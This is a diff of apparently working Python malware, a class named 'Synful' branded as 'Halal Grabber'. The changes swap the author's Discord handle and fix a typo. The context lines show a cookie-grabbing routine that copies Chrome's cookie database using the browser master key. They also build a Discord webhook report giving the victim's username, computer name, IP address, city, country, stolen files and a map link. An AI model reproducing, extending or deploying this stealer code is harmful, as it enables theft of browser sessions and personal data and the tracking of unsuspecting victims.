@@ -221,7 +221,7 @@ class Synful:
     def grabCookies(self):
         master_key = self.get_master_key()
         f = open(self.tempfolder+"\\google-cookies.txt", "w", encoding="cp437", errors='ignore')
-        f.write("synthetic#2958 | https://discord.gg/GWE3EDbf")
+        f.write("W 0V4Basement | https://discord.gg/GWE3EDbf")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         try:
             shutil.copy2(login_db, "Loginvault.db")
@@ -372,7 +372,7 @@ class Synful:
                         "url": "https://discord.gg/GWE3EDbf",
                         "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                     },
-                    "description": f"Ther User **{os.getlogin()}** It Just Opened Halal Grabber\n```diff\n- Computer Name: {os.getenv('COMPUTERNAME')}\n- IP: {ip}\n- City: {city}\n- Region: {region}\n- Country: {country}``` ```\n{self.fileCount}{self.files}``` [Location Google Maps]({googlemap})",
+                    "description": f"The User **{os.getlogin()}** Has Just Opened Halal Grabber\n```diff\n- Computer Name: {os.getenv('COMPUTERNAME')}\n- IP: {ip}\n- City: {city}\n- Region: {region}\n- Country: {country}``` ```\n{self.fileCount}{self.files}``` [Location Google Maps]({googlemap})",
                     "color": 15277667,
 
                     "thumbnail": {
@@ -380,7 +380,7 @@ class Synful:
                     },       
 
                     "footer": {
-                      "text": "synthetic#2958 | https://discord.gg/GWE3EDbf"
+                      "text": "W 0V4BASEMENT| https://discord.gg/GWE3EDbf"
                     }
                 }
             ]
